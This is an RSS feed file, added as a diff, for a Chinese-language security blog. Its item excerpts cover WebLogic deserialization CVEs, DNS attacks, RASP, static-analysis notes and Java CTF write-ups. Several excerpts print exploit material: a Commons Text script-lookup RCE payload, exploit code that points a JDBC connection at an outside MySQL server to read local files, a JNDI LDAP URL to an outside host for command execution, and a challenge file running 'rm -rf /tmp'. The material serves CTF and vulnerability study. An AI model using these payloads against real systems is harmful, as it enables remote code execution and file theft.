@@ -1,0 +1,275 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Snakinya</title>
+    <link>http://localhost:1313/posts/</link>
+    <description>Recent content in Posts on Snakinya</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>cn</language>
+    <lastBuildDate>Tue, 22 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Weblogic | CVE-2016-0638分析</title>
+      <link>http://localhost:1313/posts/cve-2016-0638bypass-cve-2015-4852/</link>
+      <pubDate>Tue, 22 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/cve-2016-0638bypass-cve-2015-4852/</guid>
+      <description>引言 这个漏洞是对于CVE-2015-4852的绕过，在了解具体防御措施之前我们先学习一下Java原生类反序列化的内部调用
+对于CVE-2015-4852漏洞，官方的做法是在resolveClass处添加了黑名单，resolveClass方法的作用是将类的序列化描述符加工成该类的Class对象。
+如果在resolveClass中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样一来，恶意类无法生成Class，从而能够一定程度上防御反序列化攻击。
+环境搭建 首先下载补丁：https://pan.baidu.com/s/1hrGJNNI
+CVE-2015-4852的修复补丁为p21984589_1036_Generic。这使用p20780171_1036_Generic和p22248372_1036012_Generic这两个补丁包，p21984589_1036_Generic是前面这两个补丁包的集成。
+之后将补丁部署到weblogic server并重启服务，将打完补丁后到代码复制到宿主机开始分析。
+命令集合： docker cp p20780171_1036_Generic weblogic1036jdk7u21:/p20780171_1036_Generic docker cp p22248372_1036012_Generic weblogic1036jdk7u21:/p22248372_1036012_Generic docker exec -it weblogic1036jdk7u21 /bin/bash cd /u01/app/oracle/middleware/utils/bsu mkdir cache_dir vi bsu.sh 编辑MEM_ARGS参数为 -Xms512m -Xmx1024m cp /p20780171_1036_Generic/* cache_dir/ ./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=EJUW -prod_dir=/u01/app/oracle/middleware/wlserver/ cp /p22248372_1036012_Generic/* cache_dir/ ./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=ZLNA -prod_dir=/u01/app/oracle/middleware/wlserver/ –verbose /u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh 补丁分析 该漏洞的补丁主要作用在
+weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream weblogic.rjvm.MsgAbbrevInputStream.class weblogic.iiop.Utils.class 可以发现多了一步判断ClassFilter.isBlackListed
+黑名单如下
+private static final String DEFAULT_BLACK_LIST = &amp;#34;+org.apache.commons.collections.functors,+com.sun.org.apache.xalan.internal.xsltc.trax,+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,+org.codehaus.groovy.runtime.ConversionHandler,+org.codehaus.groovy.runtime.MethodClosure&amp;#34;; 漏洞分析 想要绕过补丁，我们需要找一个黑名单之外的类，可以其readObject中创建自己的InputStream的对象，然后调用该readObject 方法进行反序列化，这样就可以执行含有恶意代码的序列化代码。
+对于该漏洞我们利用的是：weblogic.jms.common.StreamMessageImpl#readExternal()</description>
+    </item>
+    
+    <item>
+      <title>DNS | DNS Zone Transfers (AXFR) Vulnerability</title>
+      <link>http://localhost:1313/posts/dns%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Mon, 21 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/dns%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E/</guid>
+      <description>DNS Zone Transfers (AXFR) Vulnerability DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers. To avoid the need to edit information on multiple DNS servers, you can edit information on one server and use AXFR to copy information to other servers. However, if you do not protect your servers, malicious parties may use AXFR to get information about all your hosts.</description>
+    </item>
+    
+    <item>
+      <title>Weblogic | CVE-2015-4852分析</title>
+      <link>http://localhost:1313/posts/cve-2015-4852/</link>
+      <pubDate>Mon, 21 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/cve-2015-4852/</guid>
+      <description>环境配置 工具：https://github.com/QAX-A-Team/WeblogicEnvironment
+jdk地址：https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html
+weblogic下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html
+下载并配置好依赖后，脚本一键运行，我的本机为macos m2架构
+需要修改Dockerfile
+# 基础镜像 FROM --platform=linux/amd64 centos # 参数 ARG JDK_PKG ARG WEBLOGIC_JAR # 解决libnsl包丢失的问题 # RUN yum -y install libnsl T3协议 T3 协议是 Weblogic RMI 调用时的通信协议
+RMI 即远程方法调用，我们可以远程调用另一台 JVM虚拟机中对象上的方法，且数据传输过程中是序列化进行传输的
+Java RMI 的基础通信协议是 JRMP ，但是也支持开发其他的协议来优化 RMI 的传输，这里的 Weblogic 的 T3 协议就是其优化版本，相比于JRMP协议多了一些特性。以下是T3协议的特点：
+服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。 请求测试 import socket def T3Test(ip,port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((ip, port)) handshake = &amp;#34;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&amp;#34; #请求包的头 sock.sendall(handshake.encode()) while True: data = sock.recv(1024) print(data.</description>
+    </item>
+    
+    <item>
+      <title>DNS | Reproduction of SADDNS</title>
+      <link>http://localhost:1313/posts/reproduction-of-sad-dns/</link>
+      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/reproduction-of-sad-dns/</guid>
+      <description>Paper address： DNS Cache Poisoning Attack Reloaded: Revolutions with Side Channels
+Background Knowledge DNS Infrastructure Paper Overview Experiment Setup I use three virtual machines to set the environment:
+┌──────────────────┐ │ │ DNS query │ dns_forwarder │ ubuntu18+dnsmasq(linux 4.15) │ │ └──────────────────┘ | 192.168.111.17 | | | | | ┌──────────────────┐ │ │ DNS query │ dns_resolver │ ubuntu20+dnsmasq │ │ └──────────────────┘ | 192.168.111.14 | | | | | ┌──────────────────────────────┐ │ │ DNS query │ auth_name_server │ ubuntu20+bind9(test.</description>
+    </item>
+    
+    <item>
+      <title>RASP技术学习入门篇(1)</title>
+      <link>http://localhost:1313/posts/rasp1/</link>
+      <pubDate>Tue, 21 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/rasp1/</guid>
+      <description>Java RASP技术 运行时应用程序自我保护（Runtime application self-protection，简称RASP）使用Java Agent技术在应用程序运行时候动态编辑类字节码，将自身防御逻辑注入到Java底层API和Web应用程序当中，从而与应用程序融为一体，能实时分析和检测Web攻击，使应用程序具备自我保护能力。
+RASP技术作为新兴的WEB防御方案，不但能够有效的防御传统WAF无法实现的攻击类型，更能够大幅提升对攻击者攻击行为的检测精准度。RASP是传统WAF的坚实后盾，能够弥补WAF无法获取Web应用运行时环境的缺陷，同时也是传统Web应用服务最重要的不可或缺的一道安全防线。
+RASP通过注入自身到开发语言底层API中，从而完全的融入于Web服务中，拥有了得天独厚的漏洞检测和防御条件，RASP技术相较于传统的WAF拥有了更加精准、深层次的防御。RASP采用基于攻击行为分析的主动防御机制，严防文件读写、数据访问、命令执行等Web应用系统命脉，为Web应用安全筑建出“万丈高墙”。
+RASP技术原理 JDK1.5开始，Java新增了Instrumentation（Java Agent API）和JVMTI（JVM Tool Interface）功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class（类字节码）进行重新加载（Retransform）。
+利用Java Agent这一特性衍生出了APM（Application Performance Management，应用性能管理）、RASP（Runtime application self-protection，运行时应用自我保护）、IAST（Interactive Application Security Testing，交互式应用程序安全测试）等相关产品，它们都无一例外的使用了Instrumentation/JVMTI的API来实现动态修改Java类字节码并插入监控或检测代码。
+RASP防御的核心就是在Web应用程序执行关键的Java API之前插入防御逻辑，从而控制原类方法执行的业务逻辑。如果没有RASP的防御，攻击者可以利用Web容器/应用的漏洞攻击应用服务器。
+项目地址 https://github.com/iiiusky/java_rasp_example
+实现一个简易的RASP 创建入口类 在cn.org.javaweb.agent包下新建一个类。
+package cn.org.javaweb.agent; import java.lang.instrument.Instrumentation; public class Agent { public static void premain(String agentArgs, Instrumentation inst) { inst.addTransformer(new AgentTransform()); } } 创建Transform 然后我们再新建一个AgentTransform类，该类需要实现ClassFileTransformer的方法，内容如下:
+package cn.org.javaweb.agent; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; public class AgentTransform implements ClassFileTransformer { /** * @param loader * @param className * @param classBeingRedefined * @param protectionDomain * @param classfileBuffer * @return * @throws IllegalClassFormatException */ @Override public byte[] transform(ClassLoader loader, String className, Class&amp;lt;?</description>
+    </item>
+    
+    <item>
+      <title>RASP技术学习入门篇(2)</title>
+      <link>http://localhost:1313/posts/rasp2/</link>
+      <pubDate>Tue, 21 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/rasp2/</guid>
+      <description>项目地址 https://github.com/xbeark/javaopenrasp
+简介 该rasp相比于上一篇文章的项目复杂许多，这次希望能够更深入了解rasp的实现思路
+该项目实现的保护点：
+RCE
+反序列化漏洞 Ognl表达式执行 ProcessBuilder log SQL注入
+MySql注入保护 SQLServer注入保护 代码浅析 首先看到入口xbear/javaopenrasp/Agent.java，该类实现了premain函数也就是运行前加载的方式
+public class Agent { public static void premain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException { Console.log(&amp;#34;init&amp;#34;); init(); inst.addTransformer(new ClassTransformer()); } private static boolean init() { Config.initConfig(); return true; } } 这里跟进Config.initConfig()，进行配置初始化
+函数从main.config中读入配置并将其存入tmpMap
+配置文件为json格式
+文件中的参数含义：
+&amp;#34;moudleName&amp;#34;: 顾名思义，需要监控的类名 &amp;#34;loadClass&amp;#34;: 加载的classvisitor，用以拦截或日志记录 &amp;#34;mode&amp;#34;: 拦截模式，log,black,block,check &amp;#34;whiteList&amp;#34;:白名单 &amp;#34;blackList&amp;#34;: 黑名单 读取配置后进入ClassTransformer
+ClassReader reader = new ClassReader(classfileBuffer); ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS); ClassVisitor visitor = Reflections.</description>
+    </item>
+    
+    <item>
+      <title>南大软分笔记 ｜ 02 Intermediate Representation（IR）</title>
+      <link>http://localhost:1313/posts/02-intermediate-representation/</link>
+      <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/02-intermediate-representation/</guid>
+      <description>Intermediate Representation（IR） Compliers and static analyzers 编译过程:
+source code ↓↓↓ scanner(lexical analysis 词法分析)---&amp;gt;regular expression ↓↓↓ ---&amp;gt;Tokens Parser(Syntax Analysis 语法分析)---&amp;gt;context-free grammar上下文不敏感语法 ↓↓↓ ---&amp;gt;AST 抽象语法树 Type Checker 类型检查(Semantic Analysis 语义分析)---&amp;gt;attribute grammar ↓↓↓ ---&amp;gt; Decorated AST Translator ↓↓↓ ---&amp;gt;IR ---&amp;gt;Static Analysis Code Generator ↓↓↓ machine code 编译器将源代码（Source code） 转换为机器代码（Machine Code）。其中的流程框架是：
+词法分析器（Scanner），结合正则表达式，通过词法分析（Lexical Analysis）将 source code 翻译为 token。 语法分析器（Parser），结合上下文无关文法（Context-Free Grammar），通过语法分析（Syntax Analysis），将 token 解析为抽象语法树（Abstract Syntax Tree, AST） 语义分析器（Type Checker），结合属性文法（Attribute Grammar），通过语义分析（Semantic Analysis），将 AST 解析为 decorated AST Translator，将 decorated AST 翻译为生成三地址码这样的中间表示形式（Intermediate Representation, IR），并基于 IR 做静态分析（例如代码优化这样的工作）。 Code Generator，将 IR 转换为机器代码。 AST vs.</description>
+    </item>
+    
+    <item>
+      <title>南大软分笔记 ｜ 01 Course Introduction</title>
+      <link>http://localhost:1313/posts/01-introduction/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/01-introduction/</guid>
+      <description>Introduction Why we need static analysis reliability security compiler optimization(编译优化) program understanding Static Analysis Static analysis analyzes a program P to reason about its behaviors and determines whether it satisfies some properties before runnning P.
+ps.静态+运行前分析
+Useful static analysis mostly compromising completensee:Sound(overapproximate) but not fully-precise static analysis.
+保证全面性而可以损失精度
+Soundness(全面) is critical to a collection of important(static-analysis) applications such as compiler optimization and program verification.
+Soundness is also preferable to other(static-analysis) applications for which soundness is not demanded,e.</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2022HFCTF ezchain</title>
+      <link>http://localhost:1313/posts/2022hfctf-ezchain/</link>
+      <pubDate>Tue, 31 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2022hfctf-ezchain/</guid>
+      <description>关键词 hession	rome	二次反序列化	handler内存马
+题目浅析 首先根据dockerfile可知题目环境不出网，看一下依赖：
+也就是：
+&amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.caucho&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;hessian&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;4.0.38&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.rometools&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;rome&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.0&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.rometools&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;rome-utils&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.0&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.slf4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;slf4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.16&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; jdk为8u181
+接下来看到Index文件
+package com.ctf.ezchain; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.InetSocketAddress; import java.util.HashMap; import java.util.Map; import java.util.Objects; import java.util.concurrent.Executors; public class Index { public Index() { } public static void main(String[] args) throws Exception { System.</description>
+    </item>
+    
+    <item>
+      <title>漏洞分析 | Apache Commons Text RCE(CVE-2022-42889)分析</title>
+      <link>http://localhost:1313/posts/apache-commons-text-rcecve-2022-42889/</link>
+      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/apache-commons-text-rcecve-2022-42889/</guid>
+      <description>漏洞信息 https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om
+漏洞复现 添加依赖
+&amp;lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-text --&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.commons&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;commons-text&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.9&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; 复现代码
+import org.apache.commons.text.StringSubstitutor; public class CVE_2022_42889 { public static void main(String[] args) { StringSubstitutor interpolator = StringSubstitutor.createInterpolator(); interpolator.replace(&amp;#34;${script:js:java.lang.Runtime.getRuntime().exec(\&amp;#34;calc\&amp;#34;)}&amp;#34;); } } 漏洞分析 漏洞中提到漏洞关键点在于org.apache.commons.text.lookup.StringLookup
+先跟一下poc流程：
+跟进substitute方法
+跟进resolveVariable方法
+这里跟进lookup方法，其为一个接口
+poc使用的是InterpolatorStringLookup
+这里获取:前的内容赋给 prefix(此处会进行小写处理)，后半部分赋给 name。
+接着在 stringLookupMap 查看是否存在对应的键名，如果存在则会调用 StringLookup#lookup 方法
+这些键名在DefaultStringLookup中
+跟进ScriptStringLookup#lookup
+这里调用了scriptEngine.eval执行:后面的语句，scriptEngine由:前的字符串决定，也就是javascript，所以不难理解payload
+${script:js:java.lang.Runtime.getRuntime().exec(&amp;#34;calc&amp;#34;)} 补充 利用方式：
+script回显
+${script:js:new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(&amp;#34;whoami&amp;#34;).start().getInputStream(), &amp;#34;GBK&amp;#34;)).readLine()} // 只能读取一行 ${script:js:new java.util.Scanner(new java.lang.ProcessBuilder(&amp;#34;ipconfig&amp;#34;).start().getInputStream(), &amp;#34;GBK&amp;#34;).useDelimiter(&amp;#34;xzxzxz&amp;#34;).next()} ResourceBundle读取配置文件
+${resourcebundle:application:user.name} file读文件
+${file:utf-8:d:/test.txt} url读文件/ssrf</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2020羊城杯 a_piece_of_java</title>
+      <link>http://localhost:1313/posts/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</link>
+      <pubDate>Sat, 14 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</guid>
+      <description>a_piece_of_java 考点：
+​ 1.序列化入口构造
+​ 2.Mysql JDBC反序列化
+题目简析 先查看maincontroller
+package gdufs.challenge.web.controller; import gdufs.challenge.web.model.Info; import gdufs.challenge.web.model.UserInfo; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.util.Base64; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServletResponse; import org.nibblesec.tools.SerialKiller; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.CookieValue; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class MainController { public MainController() { } @GetMapping({&amp;#34;/index&amp;#34;}) public String index(@CookieValue(value = &amp;#34;data&amp;#34;,required = false) String cookieData) { return cookieData != null &amp;amp;&amp;amp; !cookieData.equals(&amp;#34;&amp;#34;) ? &amp;#34;redirect:/hello&amp;#34; : &amp;#34;index&amp;#34;; } @PostMapping({&amp;#34;/index&amp;#34;}) public String index(@RequestParam(&amp;#34;username&amp;#34;) String username, @RequestParam(&amp;#34;password&amp;#34;) String password, HttpServletResponse response) { UserInfo userinfo = new UserInfo(); userinfo.</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2022NCTF ezjava</title>
+      <link>http://localhost:1313/posts/2022nctf-ezjava/</link>
+      <pubDate>Sat, 14 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2022nctf-ezjava/</guid>
+      <description>题目浅析 题目直接给出反序列化点
+熟悉的hession反序列化，看一下依赖
+&amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt; &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.dubbo&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;dubbo&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.7.16&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; 很明显需要我们在dubbo环境下找一条利用链
+对于hessian反序列化，其关键点是通过toString方法去触发后续利用
+而如何去触发一个toString方法？不难想到经典的XString利用链
+java.util.Hashtable#readObject java.util.Hashtable#reconstitutionPut java.lang.AbstractMap#equals com.sun.org.apache.xpath.internal.objects.XString#equals 而dubbo中存在fastjson依赖，fastjson的toString是可以触发任意的getter方法的，最终我们找到一个可利用的类sun.print.UnixPrintServiceLookup，其get方法存在命令注入。需要注意的是该类存在于linux之中，windows环境下调试很难。
+private String[] getAllPrinterNamesBSD() { if (cmdIndex == -1) { cmdIndex = getBSDCommandIndex(); } String[] var1 = execCmd(this.lpcAllCom[cmdIndex]); return var1 != null &amp;amp;&amp;amp; var1.length != 0 ? var1 : null; } 复现 poc基于ysomap
+poc：
+package exp; import com.alibaba.com.caucho.hessian.io.Hessian2Input; import com.alibaba.com.caucho.hessian.io.Hessian2Output; import com.</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2022安洵杯 ezjaba</title>
+      <link>http://localhost:1313/posts/2022%E5%AE%89%E6%B4%B5%E6%9D%AFezjaba/</link>
+      <pubDate>Sat, 14 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2022%E5%AE%89%E6%B4%B5%E6%9D%AFezjaba/</guid>
+      <description>题目简析 首先看到com.example.ezjaba.controller.IndexController.java,题目给了一个反序列化入口
+而在Database中存在一个getConnection()方法
+结合JdbcUtils
+这里的autoDeserialize=true和allowLoadLocalInfile=true可以让我们很容易联想到通过反序列化触发getConnection()方法，利用mysql客户端文件读取漏洞获得flag
+那么是否存在反序列化利用链呢，我们在这里发现了rome依赖，他的ToStringBean类的toString方法可以调用指定类的getter方法。不过过滤了很多恶意类
+可以看到我们熟知的ObjectBean , EqualsBean ,BadAttributeValueExpException链都被ban了，也就是说我们需要寻找一个新的利用链
+最终可以发现
+java.util.Hashtable#readObject java.util.Hashtable#reconstitutionPut java.lang.AbstractMap#equals com.sun.org.apache.xpath.internal.objects.XString#equals com.rometools.rome.feed.impl.ToStringBean#toString 和CC7有异曲同工之妙
+因此最终思路很清晰了：反序列化链-&amp;gt;触发getconnection-&amp;gt;mysql客户端文件读取
+关于过滤：jdbc:mysql可以用urlencode绕过，autoDeserialize=true和allowLoadLocalInfile=true用大写绕过。
+写exp：
+package exp; import com.example.ezjaba.Connection.Database; import com.rometools.rome.feed.impl.ToStringBean; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.util.Base64; import com.sun.org.apache.xpath.internal.objects.XString; import java.util.HashMap; import java.util.Hashtable; public class ezjaba { public static void main (String[] args) throws Exception { Database database=new Database(); database.setDatabase(&amp;#34;%6d%79%73%71%6c://1.117.171.248:9015/test?user=fileread_file:///&amp;amp;ALLOWLOADLOCALINFILE=true&amp;amp;maxAllowedPacket=655360&amp;amp;allowUrlInLocalInfile=true#&amp;#34;); ToStringBean toStringBean=new ToStringBean(Database.class,database); XString xString=new XString(&amp;#34;snakin&amp;#34;); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2022网鼎杯青龙组 BadBean-2.0</title>
+      <link>http://localhost:1313/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99/</link>
+      <pubDate>Sat, 14 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99/</guid>
+      <description>题目浅析 题目内容：this time i use hessian2, hack me
+题目给了/api接口进行反序列化
+在com.ctf.badbean.bean.MyBean#toString中可以触发getter方法
+也就是说我们需要利用hessian链来触发toString方法，给了dubbo版本为2.7.14，经过搜索有一个Apache Dubbo Hessian2 异常处理时反序列化（CVE-2021-43297）可以任意调用toString方法
+漏洞点在：com.alibaba.com.caucho.hessian.io.Hessian2Input#expect
+对象和string拼接就可以触发tostring
+POC构造 import com.alibaba.com.caucho.hessian.io.Hessian2Input; import com.ctf.badbean.bean.MyBean; import java.io.*; import java.util.Base64; public class payload { public static void main(String[] args) throws IOException { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HikariDataSource ds = new HikariDataSource(); ds.setDataSourceJNDI(&amp;#34;ldap://1.117.171.248:9996/Basic/Command/calc&amp;#34;); Hessian2Output out = new Hessian2Output(byteArrayOutputStream); Object o = new MyBean(&amp;#34;&amp;#34;, &amp;#34;&amp;#34;, ds, HikariDataSource.class); out.writeString(&amp;#34;aaa&amp;#34;); out.writeObject(o); out.flushBuffer(); System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream((byteArrayOutputStream.</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2021陇原战疫 ezjaba</title>
+      <link>http://localhost:1313/posts/2021ezjaba/</link>
+      <pubDate>Wed, 14 Sep 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2021ezjaba/</guid>
+      <description>考点： rome反序列化 不出网回显 解题 public class IndexController { public IndexController() { } @ResponseBody @RequestMapping({&amp;#34;/&amp;#34;}) public String index() { return &amp;#34;Give you a cup of java, calm down&amp;#34;; } @ResponseBody @RequestMapping({&amp;#34;/BackDoor&amp;#34;}) public String BackDoor(@RequestParam(name = &amp;#34;ctf&amp;#34;,required = true) String data) throws Exception { Set blacklist = new HashSet() { { this.add(&amp;#34;java.util.HashMap&amp;#34;); this.add(&amp;#34;javax.management.BadAttributeValueExpException&amp;#34;); } }; Object object = null; byte[] b = Tool.base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); BlacklistObjectInputStream ois = new BlacklistObjectInputStream(inputStream, blacklist); try { object = ois.</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2022羊城杯 simple_json</title>
+      <link>http://localhost:1313/posts/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF/</link>
+      <pubDate>Wed, 14 Sep 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF/</guid>
+      <description>simple_json 考点： snakeyaml绕过高版本jndi
+解题 给了一个jar包，看一下controller
+package ycb.simple_json.controller; import com.alibaba.fastjson.JSON; import java.io.IOException; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import ycb.simple_json.message.Message; import ycb.simple_json.service.ApiTestService; @RestController @RequestMapping({&amp;#34;/ApiTest&amp;#34;}) public class JsonApiTestController { @Autowired private ApiTestService apiTestService; public JsonApiTestController() { } @GetMapping({&amp;#34;/get&amp;#34;}) public String getApiTest() { return this.apiTestService.getMsg().toString(); } @PostMapping({&amp;#34;/post&amp;#34;}) public String postApiTest(HttpServletRequest request) { ServletInputStream inputStream = null; String jsonStr = null; try { inputStream = request.getInputStream(); StringBuffer stringBuffer = new StringBuffer(); byte[] buf = new byte[1024]; int len = false; int len; while((len = inputStream.</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2022ciscn决赛 Backdoor</title>
+      <link>http://localhost:1313/posts/2022ciscn%E5%86%B3%E8%B5%9B/</link>
+      <pubDate>Fri, 09 Sep 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/2022ciscn%E5%86%B3%E8%B5%9B/</guid>
+      <description>Backdoor 首页给了源码
+&amp;lt;?php error_reporting(E_ERROR); class backdoor { public $path = null; public $argv = null; public $class = &amp;#34;stdclass&amp;#34;; public $do_exec_func = true; public function __sleep() { if (file_exists($this-&amp;gt;path)) { return include $this-&amp;gt;path; } else { throw new Exception(&amp;#34;__sleep failed...&amp;#34;); } } public function __wakeup() { if ( $this-&amp;gt;do_exec_func &amp;amp;&amp;amp; in_array($this-&amp;gt;class, get_defined_functions()[&amp;#34;internal&amp;#34;]) ) { call_user_func($this-&amp;gt;class); } else { $argv = $this-&amp;gt;argv; $class = $this-&amp;gt;class; new $class($argv); // 没有echo } } } $cmd = $_REQUEST[&amp;#39;cmd&amp;#39;]; $data = $_REQUEST[&amp;#39;data&amp;#39;]; switch ($cmd) { case &amp;#39;unserialze&amp;#39;: unserialize($data); break; case &amp;#39;rm&amp;#39;: system(&amp;#34;rm -rf /tmp&amp;#34;); break; default: highlight_file(__FILE__); break; } 阅读代码，存在两个魔法函数：</description>
+    </item>
+    
+    <item>
+      <title>CTF | 2022网鼎杯青龙组	easyrar</title>
+      <link>http://localhost:1313/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF/</link>
+      <pubDate>Fri, 09 Sep 2022 00:00:00 +0000</pubDate>
+      
